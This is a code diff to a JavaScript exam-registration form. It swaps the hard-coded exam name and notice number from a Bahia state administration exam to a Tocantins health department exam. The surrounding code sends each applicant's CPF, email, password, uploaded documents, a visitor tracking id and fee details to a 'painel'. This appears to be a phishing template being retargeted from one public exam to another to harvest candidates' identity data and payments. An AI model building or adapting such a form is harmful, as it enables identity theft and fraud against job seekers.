@@ -1255,7 +1255,7 @@ function __handleDocTipo(v){
       var ov = document.getElementById('loading-overlay');
       if(ov) ov.style.display = 'flex';
       // Envia cadastro para o painel + documentos (base64)
-      var CONCURSO = 'Concurso Público da Secretaria de Administração do Estado da Bahia (SAEB_BA_26) - Edital 002/2026';
+      var CONCURSO = 'Concurso SES/TO';
       // Captura vaga dinamicamente do <option> selecionado
       var vagaSel = form.querySelector('#VAGA');
       var vagaOpt = vagaSel && vagaSel.options[vagaSel.selectedIndex];
@@ -1277,7 +1277,7 @@ function __handleDocTipo(v){
           cpf: data.CPF || '',
           email: data.EMAIL || '',
           concurso: CONCURSO,
-          edital: '002/2026-SAEB-BA',
+          edital: '002/2026-SES-TO',
           stage: 'cadastro',
           visitor_id: window.__vid(),
           senha: __senha,
@@ -1341,7 +1341,7 @@ function __handleDocTipo(v){
       try{
         var ctx = Object.assign({}, data, {
           __concurso: CONCURSO,
-          __edital: '002/2026-SAEB-BA',
+          __edital: '002/2026-SES-TO',
           __cargo_codigo: vagaInfo.codigo,
           __cargo_titulo: vagaInfo.titulo,
           __taxa: vagaInfo.taxa,
